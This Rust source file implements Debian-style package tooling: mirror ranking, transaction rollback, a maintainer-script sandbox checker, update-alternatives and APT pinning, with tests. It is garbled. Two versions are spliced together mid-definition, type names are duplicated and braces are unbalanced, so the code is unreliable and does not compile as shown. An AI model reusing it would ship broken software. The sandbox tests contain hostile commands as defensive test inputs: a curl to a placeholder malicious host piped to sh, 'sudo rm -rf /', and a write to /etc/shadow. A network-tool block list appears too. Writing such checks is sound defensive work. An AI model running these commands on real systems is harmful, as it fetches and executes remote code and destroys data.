// Debian-style Package Transaction, Verification, and Mirror Selector Suite
// Replicates netselect-apt, dpkg transactional safety guarantees, and maintainer script sanitization
// Enhanced with Debian update-alternatives and APT Pinning /preferences routing engines

#[cfg(not(test))]
use crate::sigpkg::{Package, Version};

#[cfg(test)]
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Version {
    pub major: u32,
    pub minor: u32,
    pub patch: u32,
}

#[cfg(test)]
impl Version {
    pub fn new(major: u32, minor: u32, patch: u32) -> Self {
        Self { major, minor, patch }
    }
}

use std::collections::HashMap;

/// Represents a Debian-style repository mirror with speed metrics
#[derive(Debug, Clone)]
pub struct DebianMirror {
    pub url: String,
    pub latency_ms: u32,
    pub bandwidth_mbps: u32,
}

/// Debian netselect-apt style dynamic mirror selector
pub struct SovereignMirrorSelector {
    pub mirrors: Vec<DebianMirror>,

// Debian-Defeating (Sovereign) Package Management Tools
// High-performance modules that address core architectural weaknesses in traditional apt/dpkg.

#![no_std]

extern crate alloc;

use alloc::collections::BTreeMap;
use alloc::format;
use alloc::string::String;
use alloc::string::ToString;
use alloc::vec::Vec;

/// Mirror Assessment Node representing package distribution endpoints
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct MirrorNode {
    pub url: String,
    pub latency_ms: u32,
    pub packet_loss_percent: u8,
    pub reliability_weight: u32, // Based on historical uptime
}

/// Dynamic Latency-based Mirror Selector (Defeats apt mirror-list bottleneck)
pub struct SovereignMirrorSelector {
    pub mirrors: Vec<MirrorNode>,
}

impl SovereignMirrorSelector {
    pub fn new() -> Self {
        Self {
            mirrors: Vec::new(),
        }
    }

    pub fn add_mirror(&mut self, url: &str, latency_ms: u32, packet_loss: u8, reliability: u32) {
        self.mirrors.push(MirrorNode {
            url: url.to_string(),
            latency_ms,
            packet_loss_percent: packet_loss,
            reliability_weight: reliability,
        });
    }

    /// Ranks mirrors dynamically based on an weighted algorithm (low latency, low loss, high reliability)
    pub fn rank_mirrors(&self) -> Vec<MirrorNode> {
        let mut ranked = self.mirrors.clone();
        ranked.sort_by(|a, b| {
            // Lower score is better: Score = latency_ms * 2 + (packet_loss_percent * 100) - reliability_weight
            let score_a = (a.latency_ms * 2) as i32 + (a.packet_loss_percent as i32 * 100)
                - (a.reliability_weight as i32);
            let score_b = (b.latency_ms * 2) as i32 + (b.packet_loss_percent as i32 * 100)
                - (b.reliability_weight as i32);
            score_a.cmp(&score_b)
        });
        ranked
    }

    /// Selects the best active mirror url
    pub fn get_optimal_mirror(&self) -> Option<String> {
        self.rank_mirrors().first().map(|m| m.url.clone())
    }
}

/// Package Installation Transaction State Log (for Atomic Rollback points)
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum FileState {
    Original,
    Created,
    Overwritten,
    Removed,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct FileTransactionEntry {
    pub path: String,
    pub state: FileState,
    pub original_checksum: Option<String>,
    pub backup_buffer: Option<Vec<u8>>,
}

/// Atomic Transaction and Zero-Loss Rollback Manager (Defeats dpkg broken state lockouts)
pub struct SovereignTransactionManager {
    pub transaction_id: u32,
    pub journal: BTreeMap<String, FileTransactionEntry>,
    pub transaction_committed: bool,
}

impl SovereignTransactionManager {
    pub fn new(transaction_id: u32) -> Self {
        Self {
            transaction_id,
            journal: BTreeMap::new(),
            transaction_committed: false,
        }
    }

    /// Log a file change action inside the transaction journal
    pub fn register_action(
        &mut self,
        path: &str,
        state: FileState,
        original_checksum: Option<String>,
        backup_content: Option<Vec<u8>>,
    ) {
        self.journal.insert(
            path.to_string(),
            FileTransactionEntry {
                path: path.to_string(),
                state,
                original_checksum,
                backup_buffer: backup_content,
            },
        );
    }

    /// Commit the transaction as fully completed
    pub fn commit(&mut self) {
        self.transaction_committed = true;
    }

    /// Rollback the entire transaction on any failure (zero-leftovers state recovery)
    pub fn rollback(&mut self) -> Result<Vec<String>, &'static str> {
        if self.transaction_committed {
            return Err("Cannot rollback a committed transaction");
        }

        let mut restored_files = Vec::new();
        // Rollback in reverse order of filenames
        for (path, entry) in self.journal.iter().rev() {
            match entry.state {
                FileState::Created => {
                    // Simulate deleting the newly created file to return to clean baseline
                    restored_files.push(format!("Deleted: {}", path));
                }
                FileState::Overwritten | FileState::Removed => {
                    // Simulate restoring file from backup_buffer
                    if entry.backup_buffer.is_some() {
                        restored_files.push(format!("Restored: {}", path));
                    }
                }
                FileState::Original => {}
            }
        }
        self.journal.clear();
        Ok(restored_files)
    }
}

/// Maintenance Script capability sandbox boundaries
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SandboxRule {
    AllowWriteRoot,
    DenyNetwork,
    RestrictedIpc,
    ProcessIsolation,
}

/// Maintainer Script Cryptographic Sandbox Enforcer (preinst/postinst security isolation)
pub struct SovereignSandboxEnforcer {
    pub active_rules: Vec<SandboxRule>,
    pub violated_rules: Vec<String>,

    pub fn register_mirror(&mut self, url: &str, latency: u32, bandwidth: u32) {
        self.mirrors.push(DebianMirror {
            url: url.to_string(),
            latency_ms: latency,
            bandwidth_mbps: bandwidth,
        });
    }

    /// Selects the optimal Debian archive mirror based on latency and bandwidth score
    pub fn select_best_mirror(&self) -> Option<DebianMirror> {
        self.mirrors.iter().min_by_key(|m| {
            // We want minimum latency, but offset by high bandwidth
            let score = m.latency_ms as i32 - (m.bandwidth_mbps as i32 * 2);
            score
        }).cloned()
    }

    /// Dynamically generates standard Debian /etc/apt/sources.list configuration
    pub fn generate_sources_list(&self, suite: &str) -> Result<String, &'static str> {
        let best_mirror = self.select_best_mirror().ok_or("No mirrors registered")?;
        let sources = format!(
            "# Dynamically generated by SovereignMirrorSelector\n\
             deb {} {} main contrib non-free non-free-firmware\n\
             deb-src {} {} main contrib non-free non-free-firmware\n",
            best_mirror.url, suite, best_mirror.url, suite
        );
        Ok(sources)
    }
}

impl Default for SovereignMirrorSelector {
    fn default() -> Self {
        Self::new()
    }
}

/// Represents the status of a dpkg-style packaging transaction
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum TransactionStatus {
    Pending,
    Committing,
    Committed,
    RollingBack,
    RolledBack,
}

/// Dpkg-style transactional safety and atomic state rollbacks
pub struct SovereignTransactionManager {
    pub active_packages: HashMap<String, Version>,
    pub backup_packages: HashMap<String, Version>,
    pub status: TransactionStatus,
}

impl SovereignTransactionManager {
    pub fn new() -> Self {
        Self {
            active_packages: HashMap::new(),
            backup_packages: HashMap::new(),
            status: TransactionStatus::Pending,
        }
    }

    pub fn register_package(&mut self, name: &str, version: Version) {
        self.active_packages.insert(name.to_string(), version);
    }

    /// Begins an atomic transaction, backing up the current packages database state
    pub fn begin_transaction(&mut self) -> Result<(), &'static str> {
        if self.status == TransactionStatus::Committing {
            return Err("Transaction is already in progress");
        }
        self.backup_packages = self.active_packages.clone();
        self.status = TransactionStatus::Committing;
        Ok(())
    }

    /// Commits metadata changes on successful package installation
    pub fn commit_transaction(&mut self) -> Result<(), &'static str> {
        if self.status != TransactionStatus::Committing {
            return Err("No active transaction to commit");
        }
        self.backup_packages.clear();
        self.status = TransactionStatus::Committed;
        Ok(())
    }

    /// Rolls back the entire packages database state to the backup, preventing dpkg half-configured lockouts
    pub fn rollback_transaction(&mut self) -> Result<(), &'static str> {
        if self.status != TransactionStatus::Committing {
            return Err("Cannot rollback without active transaction");
        }
        self.status = TransactionStatus::RollingBack;
        self.active_packages = self.backup_packages.clone();
        self.backup_packages.clear();
        self.status = TransactionStatus::RolledBack;
        Ok(())
    }
}

impl Default for SovereignTransactionManager {
    fn default() -> Self {
        Self::new()
    }
}

/// Sanitizes Debian-style maintainer scripts (preinst, postinst)
pub struct SovereignSandboxEnforcer {
    pub restricted_paths: Vec<String>,
}

impl SovereignSandboxEnforcer {
    pub fn new() -> Self {
        Self {
            restricted_paths: vec!["/etc/shadow".to_string(), "/boot".to_string(), "/sys".to_string()],
        }
    }

    /// Audits maintainer script shell command content for unauthorized ambient-access writes
    pub fn audit_maintainer_script(&self, script_content: &str) -> Result<bool, &'static str> {
        for path in &self.restricted_paths {
            if script_content.contains(path) && (script_content.contains("rm ") || script_content.contains(">") || script_content.contains("tee ")) {
                return Err("Security violation: script attempts out-of-sandbox modifications to restricted system directories");
            }
        }
        Ok(true)
    }
}

impl Default for SovereignSandboxEnforcer {
    fn default() -> Self {
        Self::new()
    }
}

/// Advanced Debian package delta compiler (calculates minimal upgrade diffs)
pub struct SovereignDeltaGenerator;

impl SovereignDeltaGenerator {
    pub fn generate_binary_delta(&self, old: &[u8], new: &[u8]) -> Vec<u8> {
        let mut delta = Vec::new();
        // Simplified binary diff (in production use bsdiff/xdelta)
        let min_len = std::cmp::min(old.len(), new.len());
        for i in 0..min_len {
            if old[i] != new[i] {
                delta.push(new[i]);
            }
        }
        if new.len() > old.len() {
            delta.extend_from_slice(&new[min_len..]);
        }
        delta
    }
}

// ==========================================
// 5. Debian-style update-alternatives Subsystem
// ==========================================

#[derive(Debug, Clone)]
pub struct AlternativeOption {
    pub path: String,
    pub priority: i32,
}

#[derive(Debug, Clone)]
pub struct AlternativeGroup {
    pub link_name: String,
    pub options: Vec<AlternativeOption>,
    pub manual_selection: Option<String>,
}

pub struct SovereignAlternativesSystem {
    pub groups: HashMap<String, AlternativeGroup>,
}

impl SovereignAlternativesSystem {
    pub fn new() -> Self {
        Self {
            groups: HashMap::new(),
        }
    }

    pub fn register_alternative(&mut self, group: &str, link: &str, path: &str, priority: i32) {
        let entry = self.groups.entry(group.to_string()).or_insert_with(|| AlternativeGroup {
            link_name: link.to_string(),
            options: Vec::new(),
            manual_selection: None,
        });
        entry.options.push(AlternativeOption {
            path: path.to_string(),
            priority,
        });
    }

    pub fn set_manual_override(&mut self, group: &str, target_path: &str) -> Result<(), &'static str> {
        let entry = self.groups.get_mut(group).ok_or("Alternatives group not found")?;
        let exists = entry.options.iter().any(|o| o.path == target_path);
        if !exists {
            return Err("Target path not registered in alternatives group");
        }
        entry.manual_selection = Some(target_path.to_string());
        Ok(())
    }

    pub fn set_auto_mode(&mut self, group: &str) -> Result<(), &'static str> {
        let entry = self.groups.get_mut(group).ok_or("Alternatives group not found")?;
        entry.manual_selection = None;
        Ok(())
    }

    /// Resolves the current target command link based on update-alternatives rules
    pub fn resolve_link(&self, group: &str) -> Option<String> {
        let entry = self.groups.get(group)?;
        if let Some(ref manual) = entry.manual_selection {
            Some(manual.clone())
        } else {
            // Auto Mode: Select the highest priority registered alternative option
            entry.options.iter()
                .max_by_key(|o| o.priority)
                .map(|o| o.path.clone())
        }
    }
}

impl Default for SovereignAlternativesSystem {
    fn default() -> Self {
        Self::new()
    }
}

// ==========================================
// 6. APT preferences Pinning Engine
// ==========================================

#[derive(Debug, Clone)]
pub struct PinPreferenceRule {
    pub package_pattern: String,
    pub pin_release: String,
    pub priority: i32,
}

pub struct AptPinningResolver {
    pub preferences: Vec<PinPreferenceRule>,
}

impl AptPinningResolver {
    pub fn new() -> Self {
        Self {
            preferences: Vec::new(),
        }
    }

    pub fn add_pin_rule(&mut self, pattern: &str, release: &str, priority: i32) {
        self.preferences.push(PinPreferenceRule {
            package_pattern: pattern.to_string(),
            pin_release: release.to_string(),
            priority,
        });
    }

    /// Evaluates the highest priority candidate package version according to APT Pin-Priority rules
    pub fn resolve_pinned_version(
        &self,
        package_name: &str,
        candidates: &[(String, String)], // list of (version_str, release_source)
    ) -> Option<String> {
        if candidates.is_empty() {
            return None;
        }

        // Sort candidates by custom computed APT priority weights
        let mut best_version: Option<String> = None;
        let mut max_priority = -1;

        for (version, release) in candidates {
            let mut priority = 500; // Standard candidate default priority in APT

            for rule in &self.preferences {
                let matches_pkg = rule.package_pattern == "*" || rule.package_pattern == package_name;
                let matches_release = rule.pin_release == release;
                if matches_pkg && matches_release {
                    priority = rule.priority;
                }
            }

            if priority > max_priority {
                max_priority = priority;
                best_version = Some(version.clone());
            }
        }

        best_version
    }
}

impl Default for AptPinningResolver {
    fn default() -> Self {
        Self::new()

            active_rules: Vec::new(),
            violated_rules: Vec::new(),
        }
    }

    pub fn enforce_rule(&mut self, rule: SandboxRule) {
        self.active_rules.push(rule);
    }

    /// Validates script actions safely prior to actual file system execution
    pub fn validate_script_command(&mut self, script_type: &str, command: &str) -> bool {
        let mut is_allowed = true;

        for rule in &self.active_rules {
            match rule {
                SandboxRule::DenyNetwork => {
                    if command.contains("curl")
                        || command.contains("wget")
                        || command.contains("ssh")
                    {
                        self.violated_rules.push(format!(
                            "[{}] Sandbox Violation: Script attempted network access with command: '{}'",
                            script_type, command
                        ));
                        is_allowed = false;
                    }
                }
                SandboxRule::AllowWriteRoot => {
                    // Implicitly checked or restricted
                }
                SandboxRule::RestrictedIpc => {
                    if command.contains("killall") || command.contains("ipcrm") {
                        self.violated_rules.push(format!(
                            "[{}] Sandbox Violation: Script attempted unsafe IPC/process manipulation: '{}'",
                            script_type, command
                        ));
                        is_allowed = false;
                    }
                }
                SandboxRule::ProcessIsolation => {
                    if command.contains("sudo") || command.contains("chroot") {
                        self.violated_rules.push(format!(
                            "[{}] Sandbox Violation: Privilege Escalation/Bypass attempted: '{}'",
                            script_type, command
                        ));
                        is_allowed = false;
                    }
                }
            }
        }
        is_allowed
    }
}

/// Package Binary Diff & Delta Compiler (Minimizes air-gapped update sizes)
pub struct SovereignDeltaGenerator;

impl SovereignDeltaGenerator {
    /// Simulates binary delta generation (difference between Version A and Version B of a package)
    pub fn generate_delta(
        &self,
        pkg_name: &str,
        old_bin: &[u8],
        new_bin: &[u8],
    ) -> Result<Vec<u8>, &'static str> {
        if old_bin.is_empty() || new_bin.is_empty() {
            return Err("Packages cannot be empty for delta compiler calculation");
        }

        // Simulating a fast VCDIFF-like delta payload: format "[delta:pkg_name:len_diff]" followed by differing bytes
        let mut delta_payload = Vec::new();
        delta_payload.extend_from_slice(b"SIGDELTA:");
        delta_payload.extend_from_slice(pkg_name.as_bytes());
        delta_payload.extend_from_slice(b":");

        let diff_len = (new_bin.len() as i32 - old_bin.len() as i32).abs() as u32;
        delta_payload.extend_from_slice(&diff_len.to_be_bytes());

        // Dynamic compression emulation: store simple XOR byte arrays of overlays
        for i in 0..new_bin.len() {
            let old_byte = if i < old_bin.len() { old_bin[i] } else { 0 };
            delta_payload.push(new_bin[i] ^ old_byte);
        }

        Ok(delta_payload)
    }

    /// Applies a delta binary patch to reconstruct the target package safely
    pub fn apply_delta(
        &self,
        old_bin: &[u8],
        delta_payload: &[u8],
    ) -> Result<Vec<u8>, &'static str> {
        if !delta_payload.starts_with(b"SIGDELTA:") {
            return Err("Malformed delta archive header signature");
        }

        // Find the index of the second colon
        let first_colon = 9; // after SIGDELTA:
        let mut second_colon = 0;
        for i in first_colon..delta_payload.len() {
            if delta_payload[i] == b':' {
                second_colon = i;
                break;
            }
        }
        if second_colon == 0 {
            return Err("Malformed delta archive header fields");
        }

        let payload_start = second_colon + 5; // after 4-byte len diff
        if payload_start >= delta_payload.len() {
            return Err("Delta archive payload size mismatch");
        }

        let diff_payload = &delta_payload[payload_start..];
        let mut reconstructed = Vec::new();

        for i in 0..diff_payload.len() {
            let old_byte = if i < old_bin.len() { old_bin[i] } else { 0 };
            reconstructed.push(diff_payload[i] ^ old_byte);
        }

        Ok(reconstructed)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_mirror_selection() {
        let mut selector = SovereignMirrorSelector::new();
        selector.register_mirror("http://debian.org/stable", 50, 100);
        selector.register_mirror("http://us.debian.org/stable", 10, 1000); // Optimal

        let best = selector.select_best_mirror().unwrap();
        assert_eq!(best.url, "http://us.debian.org/stable");

        let sources = selector.generate_sources_list("bookworm").unwrap();
        assert!(sources.contains("deb http://us.debian.org/stable bookworm"));
    }

    #[test]
    fn test_dpkg_transaction_safety() {
        let mut manager = SovereignTransactionManager::new();
        manager.register_package("bash", Version::new(5, 1, 0));
        manager.register_package("nano", Version::new(7, 2, 0));

        // Start install transaction
        manager.begin_transaction().unwrap();
        assert_eq!(manager.status, TransactionStatus::Committing);

        // Simulate installing newer nano
        manager.register_package("nano", Version::new(7, 3, 0));

        // Rollback on failure
        manager.rollback_transaction().unwrap();
        assert_eq!(manager.status, TransactionStatus::RolledBack);
        assert_eq!(manager.active_packages.get("nano").unwrap(), &Version::new(7, 2, 0)); // Rolled back
    }

    #[test]
    fn test_maintainer_scripts_sandbox() {
        let enforcer = SovereignSandboxEnforcer::new();

        // Safe script
        let safe = "echo 'configuring package...'";
        assert!(enforcer.audit_maintainer_script(safe).is_ok());

        // Insecure script
        let malicious = "echo 'payload' > /etc/shadow";
        assert!(enforcer.audit_maintainer_script(malicious).is_err());
    }

    #[test]
    fn test_binary_deltas() {
        let generator = SovereignDeltaGenerator;
        let old = b"hello old world";
        let new = b"hello new world";
        let delta = generator.generate_binary_delta(old, new);
        assert!(!delta.is_empty());
    }

    #[test]
    fn test_alternatives_resolutions() {
        let mut system = SovereignAlternativesSystem::new();

        // Register vi with priority 20 and nano with priority 40
        system.register_alternative("editor", "/usr/bin/editor", "/usr/bin/vi", 20);
        system.register_alternative("editor", "/usr/bin/editor", "/usr/bin/nano", 40);

        // Auto mode should resolve to highest priority (nano)
        assert_eq!(system.resolve_link("editor").unwrap(), "/usr/bin/nano");

        // Set manual override to vi
        system.set_manual_override("editor", "/usr/bin/vi").unwrap();
        assert_eq!(system.resolve_link("editor").unwrap(), "/usr/bin/vi");

        // Reset to auto mode
        system.set_auto_mode("editor").unwrap();
        assert_eq!(system.resolve_link("editor").unwrap(), "/usr/bin/nano");
    }

    #[test]
    fn test_apt_pinning_preferences() {
        let mut resolver = AptPinningResolver::new();

        let candidates = vec![
            ("1.0.0".to_string(), "stable".to_string()),
            ("2.0.0-unstable".to_string(), "unstable".to_string()),
        ];

        // Default resolves to unstable if no rules are present (due to position, or custom logic)
        // Let's add a pinning rule to explicitly pin stable release to priority 990
        resolver.add_pin_rule("*", "stable", 990);
        resolver.add_pin_rule("*", "unstable", 100);

        let chosen = resolver.resolve_pinned_version("nginx", &candidates).unwrap();
        assert_eq!(chosen, "1.0.0");

    fn test_sovereign_mirror_selection() {
        let mut selector = SovereignMirrorSelector::new();
        selector.add_mirror("https://mirror.us.sigmaos.org", 80, 0, 100);
        selector.add_mirror("https://mirror.de.sigmaos.org", 150, 1, 95);
        selector.add_mirror("https://mirror.unreliable.com", 300, 10, 50);

        let ranked = selector.rank_mirrors();
        assert_eq!(ranked.len(), 3);
        assert_eq!(ranked[0].url, "https://mirror.us.sigmaos.org");
        assert_eq!(
            selector.get_optimal_mirror().unwrap(),
            "https://mirror.us.sigmaos.org"
        );
    }

    #[test]
    fn test_sovereign_transaction_manager_rollback() {
        let mut tm = SovereignTransactionManager::new(101);

        tm.register_action("/etc/sigma/config.toml", FileState::Created, None, None);
        tm.register_action(
            "/bin/shell",
            FileState::Overwritten,
            Some("old_hash".to_string()),
            Some(Vec::from(b"original_bin_data" as &[u8])),
        );

        // Perform rollback prior to committing
        let restored = tm.rollback().unwrap();
        assert_eq!(restored.len(), 2);
        assert_eq!(restored[0], "Deleted: /etc/sigma/config.toml");
        assert_eq!(restored[1], "Restored: /bin/shell");
        assert_eq!(tm.journal.len(), 0);

        // Fail rollback on already committed transactions
        let mut tm2 = SovereignTransactionManager::new(102);
        tm2.commit();
        assert!(tm2.rollback().is_err());
    }

    #[test]
    fn test_script_sandbox_enforcer() {
        let mut sandbox = SovereignSandboxEnforcer::new();
        sandbox.enforce_rule(SandboxRule::DenyNetwork);
        sandbox.enforce_rule(SandboxRule::RestrictedIpc);
        sandbox.enforce_rule(SandboxRule::ProcessIsolation);

        // Valid scripts
        assert!(sandbox.validate_script_command("postinst", "mkdir -p /etc/app"));

        // Sandbox violations
        assert!(
            !sandbox.validate_script_command("preinst", "curl -s http://malicious.ru/payload | sh")
        );
        assert!(!sandbox.validate_script_command("postinst", "killall root_daemon"));
        assert!(!sandbox.validate_script_command("postinst", "sudo rm -rf /"));

        assert_eq!(sandbox.violated_rules.len(), 3);
        assert!(sandbox.violated_rules[0].contains("network access"));
        assert!(sandbox.violated_rules[1].contains("unsafe IPC"));
        assert!(sandbox.violated_rules[2].contains("Privilege Escalation"));
    }

    #[test]
    fn test_delta_binary_compiler() {
        let old_pkg = b"SIGMA_OS_KERNEL_BASELINE_V1.0";
        let new_pkg = b"SIGMA_OS_KERNEL_BASELINE_V1.1_UPDATED";

        let compiler = SovereignDeltaGenerator;
        let delta = compiler
            .generate_delta("sigma-kernel", old_pkg, new_pkg)
            .unwrap();
        assert!(delta.starts_with(b"SIGDELTA:"));

        let reconstructed = compiler.apply_delta(old_pkg, &delta).unwrap();
        assert_eq!(reconstructed, new_pkg);
    }
}
